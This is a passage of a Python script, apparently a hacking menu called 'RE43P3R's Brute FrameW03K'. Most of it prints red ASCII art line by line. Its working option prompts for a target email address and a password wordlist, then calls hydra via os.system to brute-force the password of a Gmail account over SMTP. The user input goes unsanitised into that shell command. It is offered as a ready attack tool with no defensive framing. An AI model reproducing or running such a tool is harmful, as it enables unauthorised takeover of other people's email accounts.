       print(Fore.RED+"                              *    .'       '.  .         ")   
       time.sleep(0.1)
       print(Fore.RED+"                               _.-~===========~-._ *        ") 
       time.sleep(0.1)
       print(Fore.RED+"                           .  (___________________)       *  ")
       time.sleep(0.1)
       print(Fore.RED+"                            *       \_______/        .       ")
       time.sleep(0.1)
       print(Fore.RED+"=====================================LOADING====================")
       restart_program()              


if 'A' in X:
       print(Fore.RED+"                  ... ")
       time.sleep(0.1) 
       print(Fore.RED+"                 ;::::; ")  
       time.sleep(0.1) 
       print(Fore.RED+"               ;::::; :; ")
       time.sleep(0.1)
       print(Fore.RED+"             ;:::::'   :; ")
       time.sleep(0.1) 
       print(Fore.RED+"            ;:::::;     ;. ")
       time.sleep(0.1) 
       print(Fore.RED+"           ,:::::'       ;           OOO ")
       time.sleep(0.1) 
       print(Fore.RED+"           ::::::;       ;          OOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"           ;:::::;       ;         OOOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"          ,;::::::;     ;'         / OOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"        ;:::::::::`. ,,,;.        /  / DOOOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"      .';:::::::::::::::::;,     /  /     DOOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"     ,::::::;::::::;;;;::::;,   /  /        DOOO ")
       time.sleep(0.1)
       print(Fore.RED+"    ;`::::::`'::::::;;;::::: ,#/  /          DOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    :`:::::::`;::::::;;::: ;::#  /            DOOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    ::`:::::::`;:::::::: ;::::# /              DOO ")
       time.sleep(0.1) 
       print(Fore.RED+"    `:`:::::::`;:::::: ;::::::#/               DOO ")
       time.sleep(0.1) 
       print(Fore.RED+"     :::`:::::::`;; ;:::::::::##                OO ")
       time.sleep(0.1) 
       print(Fore.RED+"     ::::`:::::::`;::::::::;:::#                OO ")
       time.sleep(0.1) 
       print(Fore.RED+"     `:::::`::::::::::::;'`:;::#                O ")
       time.sleep(0.1)
       print(Fore.RED+"    `:::::`::::::::;' /  / `:# ")
       time.sleep(0.1) 
       print(Fore.RED+"       ::::::`:::::;'  /  /   `# ")
       time.sleep(0.1) 
       print(Fore.RED+"[[[[[[[[[[[[[[[[[RE43P3R's Brute FrameW03K[[[[[[[[[[[[[[[[[[[[[[[") 
       time.sleep(0.1) 
       time.sleep(0.1) 
       os.system(' clear ') 
       email = str(input(" Email ==> "))
       word = str(input(" Path to Wordlists ==> "))
       os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word)) 
       print(Fore.RED+"================================================================") 
       time.sleep(0.1)
       print(Fore.RED+"                        *         .  _.---._          . ")      
       time.sleep(0.1)
       print(Fore.RED+"                              *    .'       '.  .         ")   
       time.sleep(0.1)
       print(Fore.RED+"                               _.-~===========~-._ *        ") 
       time.sleep(0.1)
       print(Fore.RED+"                           .  (___________________)       *  ")
       time.sleep(0.1)
       print(Fore.RED+"                            *       \_______/        .       ")
       time.sleep(0.1)
       print(Fore.RED+"=====================================LOADING====================")
       restart_program()        